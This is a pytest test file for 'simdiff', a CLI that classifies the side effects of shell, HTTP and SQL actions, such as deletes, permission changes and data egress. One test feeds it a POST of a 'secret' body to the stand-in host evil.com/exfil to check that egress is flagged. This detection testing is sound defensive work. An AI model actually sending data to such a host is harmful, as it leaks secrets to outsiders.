import json

from simdiff.cli import main


def test_shell_safe_command_exits_zero(capsys):
    code = main(["shell", "rm a.txt && mkdir b", "--existing", "a.txt", "--json"])
    out = capsys.readouterr().out
    payload = json.loads(out)
    assert code == 0
    assert payload["fully_classified"] is True
    resources = {d["resource"] for d in payload["data_access"]}
    assert {"a.txt", "b"} <= resources


def test_shell_unknown_command_exits_two(capsys):
    code = main(["shell", "frobnicate /etc", "--json"])
    payload = json.loads(capsys.readouterr().out)
    assert code == 2
    assert payload["fully_classified"] is False


def test_http_egress_via_cli(capsys):
    code = main(["http", "https://evil.com/exfil", "--method", "POST", "--body", "secret", "--json"])
    payload = json.loads(capsys.readouterr().out)
    # egress is *classified* (we understood it), so exit reflects classification,
    # not safety; the value_move is what a policy acts on.
    assert code == 0
    assert payload["value_moves"][0]["dst"] == "evil.com"


def test_http_allowed_host_via_cli(capsys):
    code = main(["http", "https://api.internal/v1/log", "--allowed-hosts", "api.internal", "--json"])
    payload = json.loads(capsys.readouterr().out)
    assert payload["value_moves"] == []


def test_render_human_shows_all_effect_kinds():
    from simdiff.cli import _render_human
    from simdiff.delta import CanonicalDelta, DataAccess, AuthorityGrant, ValueMove

    delta = CanonicalDelta(
        data_access=[DataAccess(resource="f", mode="DELETE", reason="r")],
        authority_grants=[AuthorityGrant(target="f", kind="mode", old="644", new="777", reason="chmod")],
        value_moves=[ValueMove(asset="SOL", src="a", dst="b", amount=1.0, reason="x")],
        unknown=["mystery"],
    )
    out = _render_human(delta)
    assert "DELETE" in out
    assert "auth" in out
    assert "value" in out
    assert "UNKNOWN" in out


def test_existing_paths_are_whitespace_trimmed(capsys):
    # `--existing "a.txt, b.txt"` (space after the comma) must still match `b.txt`;
    # otherwise a real delete silently vanishes from the delta.
    code = main(["shell", "rm b.txt", "--existing", "a.txt, b.txt", "--json"])
    payload = json.loads(capsys.readouterr().out)
    deletes = {d["resource"] for d in payload["data_access"] if d["mode"] == "DELETE"}
    assert "b.txt" in deletes


def test_unknown_domain_raises():
    import argparse

    import pytest

    from simdiff.cli import _build

    with pytest.raises(ValueError):
        _build(argparse.Namespace(domain="bogus", action="x"))


def test_sql_insert_human_output(capsys, tmp_path):
    import sqlite3

    db = tmp_path / "demo.db"
    c = sqlite3.connect(db)
    c.execute("CREATE TABLE t (x INTEGER)")
    c.commit()
    c.close()

    code = main(["sql", "INSERT INTO t (x) VALUES (1)", "--db", str(db)])
    out = capsys.readouterr().out
    assert code == 0
    assert "WRITE" in out
    assert "t" in out
